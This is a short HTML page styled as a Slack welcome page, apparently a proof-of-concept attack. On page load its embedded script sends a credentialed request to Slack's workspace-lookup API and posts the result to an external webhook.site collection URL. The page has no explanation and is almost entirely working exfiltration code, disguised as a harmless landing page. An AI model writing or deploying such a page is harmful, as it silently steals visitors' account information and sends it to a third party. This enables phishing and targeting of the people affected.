<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Workspace Finder</title>
    <script>
        fetch("https://slack.com/api/signin.findWorkspaces", {
            method: "GET",
            credentials: "include"
        })
        .then(response => response.text()) 
        .then(data => {
            fetch("https://webhook.site/c1acb3f9-304c-414d-b941-3e8094798029", {  
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({ workspaces: data })
            });
        })
        .catch(error => console.error("Error:", error));
    </script>
</head>
<body>
    <h1>Welcome to Slack!</h1>
</body>
</html>
